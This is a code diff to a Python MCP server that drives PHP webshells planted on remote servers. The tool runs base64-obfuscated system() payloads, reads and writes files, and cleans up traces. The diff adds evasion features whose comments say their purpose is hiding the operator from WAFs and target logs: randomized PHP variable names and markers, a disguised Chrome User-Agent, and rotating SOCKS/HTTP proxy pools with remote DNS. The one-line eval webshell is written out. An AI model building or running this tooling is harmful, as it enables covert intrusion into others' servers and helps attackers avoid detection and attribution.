@@ -14,9 +14,10 @@ Webshell MCP —— ARTEX 的 WebShell 会话管理 MCP 服务器（纯 Python �
 3. 载荷约定（决定了「远端要装什么马」）：
    - php     一句话 eval 马，例如 <?php @eval($_POST['pass']); ?>
              客户端把命令 base64 后塞进 `base64_decode('…')`，由 PHP 侧 system() 执行，
-             ob_start 捕获输出，再用 <<ARTEXMKB>>…<<ARTEXMKE>> 标记 + base64 回传，
+             ob_start 捕获输出，再用按会话派生的 <<标记>>…<<标记>> + base64 回传，
              客户端剥掉标记只留纯 stdout。这样 WAF 看不到明文命令，回显也不受马自身
-             前后缀干扰。
+             前后缀干扰。标记不含任何工具字样（按参数名 sha256 派生），响应被完整
+             记录时也认不出是谁在打。
              如果远端其实不是 eval 型（HTTP 200 但无标记），自动回退到「base64 免杀马」
              模式，等价于 system(base64_decode($_POST['pass']))，并把判定结果缓存在进程内，
              后续同会话不再重复探测。
@@ -82,10 +83,6 @@ ERR_METHOD_NOT_FOUND = -32601
 ERR_INVALID_PARAMS = -32602
 ERR_INTERNAL = -32603
 
-# 回显标记：PHP 侧把 base64(输出) 夹在这两个标记之间回传
-MK_B = "<<ARTEXMKB>>"
-MK_E = "<<ARTEXMKE>>"
-
 # 常见一句话马自带的回显前后缀（只收录不会误伤正常输出的经典标记）
 MARKER_DIRT = ("->|", "|<-", "<-|", "|->")
 
@@ -97,7 +94,14 @@ DOWNLOAD_MAX = 64 * 1024 * 1024     # 下载上限 64MB（tool 参数夹紧用�
 EXEC_OUTPUT_LIMIT = 100 * 1024      # exec 回显截断 100KB
 HTTP_BODY_LIMIT = 16 * 1024 * 1024  # 单次响应最多读 16MB
 
-USER_AGENT = "Mozilla/5.0 (compatible; ARTEX-Webshell-MCP/1.0)"
+# 默认 UA 用普通浏览器。以前自报 "ARTEX-Webshell-MCP/1.0"，目标侧日志里一眼就能
+# 看出是谁在打；会话可用 user_agent 覆盖。
+USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+
+# 全局默认出口代理：socks5h://[user:pass@]host:port 或 http://...
+# 会话里的 proxy 优先，这里为空且会话也没配就直连。
+PROXY_ENV = "ARTEX_WEBSHELL_PROXY"
 
 # 会话名：允许中文，禁止控制字符与路径分隔符
 NAME_RE = re.compile(r"^[^\x00-\x1f\x7f/\\]{1,64}$")
@@ -469,6 +473,119 @@ _SSL_CTX.verify_mode = ssl.CERT_NONE
 _OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_SSL_CTX))
 
 
+# ---------------------------------------------------------------------------
+# 出口隔离：会话级代理
+#
+# WebShell 请求以前是平台直连出去的，目标侧 nginx 日志里直接记着平台 IP，
+# 一出事就是「顺着这个 IP 摸回来」。现在每条会话可以配一个出口（socks5h / http，
+# 可带账密，也可以给一串让每次请求随机挑），没配就看全局 ARTEX_WEBSHELL_PROXY，
+# 都没有才直连。
+# ---------------------------------------------------------------------------
+
+def proxy_pool(raw):
+    """把「a,b,c」形式的代理池拆成列表（逗号/分号/空白分隔）。"""
+    return [p for p in re.split(r"[,;\s]+", (raw or "").strip()) if p]
+
+
+def proxy_of(sess):
+    """取这条会话该用的代理串：会话配置优先，其次全局环境变量。"""
+    p = (sess.get("proxy") or "").strip()
+    return p or (os.environ.get(PROXY_ENV) or "").strip()
+
+
+def pick_proxy(raw):
+    """从代理池里随机挑一个（用 secrets，不按时间可猜）。"""
+    pool = proxy_pool(raw)
+    if not pool:
+        return ""
+    return pool[0] if len(pool) == 1 else secrets.choice(pool)
+
+
+def redact_proxy(raw):
+    """把代理串里的账密换成 ***（列表与日志都必须走这个）。"""
+    out = []
+    for p in proxy_pool(raw):
+        try:
+            u = urllib.parse.urlsplit(p)
+        except ValueError:
+            out.append(p)
+            continue
+        if u.username or u.password:
+            netloc = "%s:***@%s" % (u.username or "***", u.hostname or "")
+            if u.port:
+                netloc += ":%d" % u.port
+            u = u._replace(netloc=netloc)
+        out.append(urllib.parse.urlunsplit(u))
+    return ",".join(out)
+
+
+def validate_proxy(raw):
+    """校验代理串格式；写错的配置在 shell_add 时就挡住。"""
+    for p in proxy_pool(raw):
+        try:
+            u = urllib.parse.urlsplit(p)
+        except ValueError:
+            raise ToolError("出口代理格式不对（%s）" % redact_proxy(p))
+        if not u.hostname or not u.port:
+            raise ToolError("出口代理要写到端口（%s），例：socks5h://127.0.0.1:1080" % redact_proxy(p))
+        if (u.scheme or "").lower() not in ("socks5", "socks5h", "http", "https"):
+            raise ToolError("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s" % u.scheme)
+
+
+def egress_label(sess):
+    """给用户看的实际出口描述。"""
+    p = proxy_of(sess)
+    if not p:
+        return "直连"
+    if not (sess.get("proxy") or "").strip():
+        return "全局代理 " + redact_proxy(p)
+    return redact_proxy(p)
+
+
+_OPENER_CACHE = {}
+
+
+def _opener_for(proxy_raw):
+    """按代理串造（并缓存）一个 opener。
+
+    socks5/socks5h 走 PySocks，且一律远端解析域名（rdns），免得本地 DNS 把
+    目标域名露给运营商；http/https 走 urllib 自带的 ProxyHandler。
+    """
+    key = pick_proxy(proxy_raw)
+    if not key:
+        return _OPENER, "直连"
+    if key in _OPENER_CACHE:
+        return _OPENER_CACHE[key], redact_proxy(key)
+
+    u = urllib.parse.urlsplit(key)
+    scheme = (u.scheme or "").lower()
+    if scheme in ("socks5", "socks5h"):
+        try:
+            import socks  # PySocks
+            import sockshandler
+        except ImportError:
+            raise ToolError("配了 socks5 出口但缺少 PySocks（pip install PySocks），"
+                            "或改用 http:// 代理")
+        kwargs = {}
+        if u.username:
+            kwargs["username"] = u.username
+            kwargs["password"] = u.password or ""
+        handler = sockshandler.SocksiPyHandler(
+            socks.SOCKS5, u.hostname, u.port, rdns=True, **kwargs)
+        opener = urllib.request.build_opener(
+            handler, urllib.request.HTTPSHandler(context=_SSL_CTX))
+    elif scheme in ("http", "https"):
+        proxy_url = key if scheme == "http" else key
+        opener = urllib.request.build_opener(
+            urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}),
+            urllib.request.HTTPSHandler(context=_SSL_CTX))
+    else:
+        raise ToolError("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s" % u.scheme)
+
+    _OPENER_CACHE[key] = opener
+    return opener, redact_proxy(key)
+
+
 def _post_payload(sess, payload, timeout, name=""):
     """发一次载荷请求，返回 (status, 响应文本)。
 
@@ -481,7 +598,7 @@ def _post_payload(sess, payload, timeout, name=""):
     method = (sess.get("method") or "POST").upper()
 
     headers = {
-        "User-Agent": USER_AGENT,
+        "User-Agent": (sess.get("user_agent") or "").strip() or USER_AGENT,
         "Accept": "*/*",
         "Accept-Encoding": "identity",  # 不请求压缩，简化解析
         "Connection": "close",
@@ -499,8 +616,9 @@ def _post_payload(sess, payload, timeout, name=""):
         headers["Content-Type"] = "application/x-www-form-urlencoded"
         req = urllib.request.Request(url, data=qs.encode("utf-8"), headers=headers, method="POST")
 
+    opener, _egress = _opener_for(proxy_of(sess))
     try:
-        resp = _OPENER.open(req, timeout=timeout)
+        resp = opener.open(req, timeout=timeout)
         try:
             raw = resp.read(HTTP_BODY_LIMIT)
             status = getattr(resp, "status", None) or resp.getcode()
@@ -536,42 +654,86 @@ def _post_payload(sess, payload, timeout, name=""):
 # 载荷构造与回显清洗
 # ---------------------------------------------------------------------------
 
-def _php_cmd_payload(cmd):
+def _php_names():
+    """给一段生成的 PHP 代码取一组一次性变量名。
+
+    以前固定用 $__artex_xxx，等于把工具名写在每个请求的 eval 代码里——WAF 解一次
+    base64 就能认出是谁。现在每次生成随机后缀；嵌套的两段代码各自随机，26^5 的
+    空间撞不上。
+    """
+    suf = "".join(secrets.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(5))
+    return {
+        "cmd": "$_" + suf + "c",
+        "out": "$_" + suf + "o",
+        "path": "$_" + suf + "p",
+        "data": "$_" + suf + "d",
+        "n": "$_" + suf + "n",
+        "size": "$_" + suf + "s",
+        "buf": "$_" + suf + "r",
+        "self": "$_" + suf + "f",
+        "inc": "$_" + suf + "g",
+        "list": "$_" + suf + "l",
+        "res": "$_" + suf + "v",
+    }
+
+
+def _markers(sess):
+    """回显标记按会话生成：同一个马才认自己那对标记，且不含任何工具字样。
+
+    标记只出现在请求/响应里，不进落地文件；用参数名派生，两端（Go 页面与这里）
+    算法一致：sha256("m:"+参数名) 前 3 字节的 hex。以前是固定常量 <<ARTEXMKB>>，
+    响应一旦被完整记录（WAF 日志、目标侧 nginx 日志）就等于自报家门。
+    """
+    key = (sess.get("password") or "pass").strip() or "pass"
+    tag = hashlib.sha256(("m:" + key).encode("utf-8")).hexdigest()[:6]
+    return "<<%sb>>" % tag, "<<%se>>" % tag
+
+
+def _php_cmd_payload(cmd, sess):
     """type=php（eval 马）：base64 传输 + system() 执行 + 输出捕获 + 标记回传。"""
     b = b64e(cmd.encode("utf-8"))
-    return ("$__artex_c=base64_decode('%s');"
-            "ob_start();@system($__artex_c);$__artex_o=ob_get_clean();"
-            "echo '%s'.base64_encode($__artex_o).'%s';" % (b, MK_B, MK_E))
+    n = _php_names()
+    mk_b, mk_e = _markers(sess)
+    return ("%s=base64_decode('%s');"
+            "ob_start();@system(%s);%s=ob_get_clean();"
+            "echo '%s'.base64_encode(%s).'%s';"
+            % (n["cmd"], b, n["cmd"], n["out"], mk_b, n["out"], mk_e))
 
 
-def _php_code_payload(code):
+def _php_code_payload(code, sess):
     """type=php_raw：把 cmd 直接当 PHP 代码执行，输出用同样的标记 + base64 捕获。"""
     c = (code or "").strip()
     if not c:
         raise ToolError("PHP 代码为空")
     if not c.endswith(";") and not c.endswith("}"):
         c += ";"
-    return ("ob_start();" + c + "$__artex_o=ob_get_clean();"
-            "echo '%s'.base64_encode($__artex_o).'%s';" % (MK_B, MK_E))
+    n = _php_names()
+    mk_b, mk_e = _markers(sess)
+    return ("ob_start();" + c + "%s=ob_get_clean();" % n["out"] +
+            "echo '%s'.base64_encode(%s).'%s';" % (mk_b, n["out"], mk_e))
 
 
 def _php_write_code(remote_path, data, append):
     """拼 PHP 文件写入代码（外层再包 _php_code_payload）。"""
     p = b64e(remote_path.encode("utf-8"))
     d = b64e(data)
-    return ("$__artex_p=base64_decode('%s');$__artex_d=base64_decode('%s');"
-            "$__artex_n=@file_put_contents($__artex_p,$__artex_d,%s);"
-            "echo ($__artex_n===false)?('ERR'):('OK:'.$__artex_n);"
-            % (p, d, "FILE_APPEND" if append else "0"))
+    n = _php_names()
+    return ("%s=base64_decode('%s');%s=base64_decode('%s');"
+            "%s=@file_put_contents(%s,%s,%s);"
+            "echo (%s===false)?('ERR'):('OK:'.%s);"
+            % (n["path"], p, n["data"], d, n["n"], n["path"], n["data"],
+               "FILE_APPEND" if append else "0", n["n"], n["n"]))
 
 
 def _php_read_code(remote_path, max_bytes):
     """拼 PHP 文件读取代码：回 'OK|原始大小|base64(内容)'。"""
     p = b64e(remote_path.encode("utf-8"))
-    return ("$__artex_p=base64_decode('%s');$__artex_s=@filesize($__artex_p);"
-            "$__artex_r=@file_get_contents($__artex_p,false,null,0,%d);"
-            "echo ($__artex_r===false)?('ERR'):('OK|'.$__artex_s.'|'.base64_encode($__artex_r));"
-            % (p, int(max_bytes)))
+    n = _php_names()
+    return ("%s=base64_decode('%s');%s=@filesize(%s);"
+            "%s=@file_get_contents(%s,false,null,0,%d);"
+            "echo (%s===false)?('ERR'):('OK|'.%s.'|'.base64_encode(%s));"
+            % (n["path"], p, n["size"], n["path"],
+               n["buf"], n["path"], int(max_bytes), n["buf"], n["size"], n["buf"]))
 
 
 def _ps_write_cmd(remote_path, data_b64, append):
@@ -597,12 +759,13 @@ def _ps_read_cmd(remote_path, max_bytes):
     return 'powershell -NoProfile -NonInteractive -Command "%s"' % body
 
 
-def _extract_marked(text):
+def _extract_marked(text, sess):
     """从响应里抠出标记之间的 base64 并解码；没有标记返回 None。"""
-    if MK_B not in text or MK_E not in text:
+    mk_b, mk_e = _markers(sess)
+    if mk_b not in text or mk_e not in text:
         return None
-    i = text.index(MK_B) + len(MK_B)
-    j = text.find(MK_E, i)
+    i = text.index(mk_b) + len(mk_b)
+    j = text.find(mk_e, i)
     if j < 0:
         return None
     blob = text[i:j]
@@ -644,9 +807,9 @@ def _exec_php(name, sess, cmd, timeout):
 
     probe_text = None
     if cached != "raw":
-        payload = _php_cmd_payload(cmd) if typ == "php" else _php_code_payload(cmd)
+        payload = _php_cmd_payload(cmd, sess) if typ == "php" else _php_code_payload(cmd, sess)
         _, text = _post_payload(sess, payload, timeout, name)
-        inner = _extract_marked(text)
+        inner = _extract_marked(text, sess)
         if inner is not None:
             _set_mode(name, "eval")
             return inner
@@ -687,8 +850,8 @@ def _run_php_code(name, sess, code, timeout):
     """在 eval 型会话里直接跑一段 PHP 代码，返回其输出文本。"""
     if _mode_of(name) == "raw":
         raise ModeMismatch("该会话已判定为「系统执行型」马，无法直接执行 PHP 代码")
-    _, text = _post_payload(sess, _php_code_payload(code), timeout, name)
-    inner = _extract_marked(text)
+    _, text = _post_payload(sess, _php_code_payload(code, sess), timeout, name)
+    inner = _extract_marked(text, sess)
     if inner is None:
         if _looks_blocked(text):
             raise ToolError("远端返回的是拦截页/非命令回显: %s" % brief(text, 200))
@@ -756,6 +919,12 @@ def tool_shell_add(args):
         clean_header[k] = str(v)
 
     note = opt_str(args, "note", "")
+    # 出口隔离：会话级代理（可给一串做池）与 UA 覆盖
+    proxy = (opt_str(args, "proxy", "") or "").strip()
+    validate_proxy(proxy)
+    user_agent = (opt_str(args, "user_agent", "") or "").strip()
+    if len(user_agent) > 512:
+        raise ToolError("user_agent 太长（上限 512 字符）")
     remote_path = (opt_str(args, "remote_path", "") or "").strip()
     if remote_path and not re.match(r"^(/|[A-Za-z]:[\\/])", remote_path):
         raise ToolError("remote_path 应是绝对路径，如 /var/www/html/s.php 或 C:\\inetpub\\s.aspx，"
@@ -778,6 +947,9 @@ def tool_shell_add(args):
             "remote_path": remote_path or (prev.get("remote_path") or ""),
             # 经 shell_upload 写过的远端文件，清痕迹时一并删除
             "artifacts": prev.get("artifacts") or [],
+            # 出口代理与 UA：空着就沿用旧配置（改个备注不该把出口清掉）
+            "proxy": proxy or (prev.get("proxy") or ""),
+            "user_agent": user_agent or (prev.get("user_agent") or ""),
             "created_at": created,
         }
         if existed:
@@ -797,6 +969,8 @@ def tool_shell_add(args):
         "  URL: %s" % _redact_url(url),
         "  方法: %s   参数名: %s" % (method, param),
         "  落地路径: %s" % (remote_path or "未记录（命令型马清痕迹时删不掉，建议现在补填 remote_path）"),
+        "  出口: %s" % egress_label(store.get(name) or {}),
+        "  UA: %s" % ((user_agent or (prev.get("user_agent") or "")) or (USER_AGENT[:48] + "…（默认浏览器 UA）")),
         "  自定义头: %s" % ("%d 个（%s）" % (len(clean_header), ", ".join(clean_header))
                             if clean_header else "无"),
         "  备注: %s" % (note or "—"),
@@ -822,12 +996,13 @@ def tool_shell_list(args):
     for name in sorted(store):
         s = store.get(name) or {}
         arts = s.get("artifacts") or []
-        rows.append("- %s | %s | %s | %s | 落地: %s | 上传残留: %d 个 | 备注: %s | 创建: %s" % (
+        rows.append("- %s | %s | %s | %s | 落地: %s | 出口: %s | 上传残留: %d 个 | 备注: %s | 创建: %s" % (
             name,
             s.get("type") or "?",
             _redact_url(s.get("url") or ""),
             (s.get("method") or "POST"),
             (s.get("remote_path") or "未记录"),
+            egress_label(s),
             len(arts) if isinstance(arts, list) else 0,
             (s.get("note") or "—"),
             (s.get("created_at") or "—"),
@@ -1093,34 +1268,42 @@ DEL_STATUS_CN = {
 # 定位马自身的真实绝对路径。不能用 __FILE__：马是 eval 执行的，__FILE__ 会变成
 # "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
 # SCRIPT_FILENAME / get_included_files()[0] 拿到的才是入口脚本的真实路径。
-SELF_PATH_CODE = (
-    "$__artex_s='';"
-    "if(!empty($_SERVER['SCRIPT_FILENAME'])){$__artex_s=$_SERVER['SCRIPT_FILENAME'];}"
-    "if($__artex_s===''){$__artex_g=@get_included_files();"
-    "if(!empty($__artex_g)){$__artex_s=$__artex_g[0];}}"
-    "if($__artex_s===''){$__artex_s=__FILE__;}"
-    "$__artex_s=(@realpath($__artex_s) ?: $__artex_s);"
-)
+def _php_self_path_code(n):
+    """拼「取马自身真实路径」的 PHP 片段。
+
+    不能用 __FILE__：马是 eval 执行的，__FILE__ 是
+    "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
+    SCRIPT_FILENAME / get_included_files()[0] 才是入口脚本的真实路径。
+    """
+    s_, g_ = n["self"], n["inc"]
+    return ("%s='';"
+            "if(!empty($_SERVER['SCRIPT_FILENAME'])){%s=$_SERVER['SCRIPT_FILENAME'];}"
+            "if(%s===''){%s=@get_included_files();"
+            "if(!empty(%s)){%s=%s[0];}}"
+            "if(%s===''){%s=__FILE__;}"
+            "%s=(@realpath(%s) ?: %s);"
+            % (s_, s_, s_, g_, g_, s_, g_, s_, s_, s_, s_, s_))
 
 
 def _php_del_code(paths, include_self=False):
     """拼 PHP 删除代码：逐个 unlink 并回报 OK / GONE / FAIL。
 
-    马自身用 SCRIPT_FILENAME 定位（见 SELF_PATH_CODE），不接收外部传入的自身路径，
-    避免误删同站的正常文件。
+    马自身用 SCRIPT_FILENAME 定位（见 _php_self_path_code），不接收外部传入的自身
+    路径，避免误删同站的正常文件。
     """
+    n = _php_names()
     items = ",".join("base64_decode('%s')" % b64e(p.encode("utf-8")) for p in (paths or []) if p)
-    parts = ["$__artex_l=[%s];" % items]
+    parts = ["%s=[%s];" % (n["list"], items)]
     if include_self:
-        parts.append(SELF_PATH_CODE)
-        parts.append("$__artex_l[]=$__artex_s;")
+        parts.append(_php_self_path_code(n))
+        parts.append("%s[]=%s;" % (n["list"], n["self"]))
     parts.append(
-        "$__artex_r=[];"
-        "foreach($__artex_l as $__artex_p){"
-        "if(!file_exists($__artex_p)){$__artex_r[]='GONE '.$__artex_p;continue;}"
-        "$__artex_r[]=(@unlink($__artex_p)?'OK ':'FAIL ').$__artex_p;"
-        "}"
-        'echo implode("\\n",$__artex_r);'
+        "%s=[];" % n["res"] +
+        "foreach(%s as %s){" % (n["list"], n["path"]) +
+        "if(!file_exists(%s)){%s[]='GONE '.%s;continue;}" % (n["path"], n["res"], n["path"]) +
+        "%s[]=(@unlink(%s)?'OK ':'FAIL ').%s;" % (n["res"], n["path"], n["path"]) +
+        "}" +
+        'echo implode("\\n",%s);' % n["res"]
     )
     return "".join(parts)
 
@@ -1160,12 +1343,12 @@ def _confirm_self_gone(name, sess, timeout):
     不能拿「空响应」当判据——加密马收到不认识的载荷本来就是空响应。
     返回 (是否已删, 说明)。
     """
-    probe = _php_code_payload("echo 'ARTEXALIVE';")
+    probe = _php_code_payload("echo 'ok';", sess)
     try:
         _, text = _post_payload(sess, probe, timeout, name)
     except ToolError as e:
         return True, "复查请求已失败（%s）" % brief(str(e), 120)
-    alive = _extract_marked(text) is not None or "ARTEXALIVE" in (text or "")
+    alive = _extract_marked(text, sess) is not None
     if alive:
         return False, "复查仍能打通马并获得回显，文件没删掉"
     if _looks_blocked(text):
@@ -1583,6 +1766,19 @@ TOOLS = [
                         "只能靠它定位，eval 型马可自己报 __FILE__）"
                     ),
                 },
+                "proxy": {
+                    "type": "string",
+                    "description": (
+                        "可选，这条会话的出口代理：socks5h://[user:pass@]host:port 或 "
+                        "http://[user:pass@]host:port。目标侧只会看到代理/节点 IP，"
+                        "看不到平台地址。也可以给逗号分隔的一串做池，每次请求随机挑一个。"
+                        "留空则用全局 ARTEX_WEBSHELL_PROXY，再空就直连"
+                    ),
+                },
+                "user_agent": {
+                    "type": "string",
+                    "description": "可选，覆盖默认 UA（默认是普通 Chrome UA，不带工具名）",
+                },
             },
             "required": ["name", "url", "type"],
         },
@@ -1590,8 +1786,8 @@ TOOLS = [
     {
         "name": "shell_list",
         "description": (
-            "列出已登记的全部 WebShell 会话（名称 / 类型 / URL / 请求方法 / 备注 / 创建时间）。"
-            "出于安全，不返回参数名（password）与自定义 header 值。"
+            "列出已登记的全部 WebShell 会话（名称 / 类型 / URL / 请求方法 / 落地路径 / 出口 / 备注 / 创建时间）。"
+            "出于安全，不返回参数名（password）与自定义 header 值，出口代理的账密打码。"
         ),
         "inputSchema": {"type": "object", "properties": {}},
     },
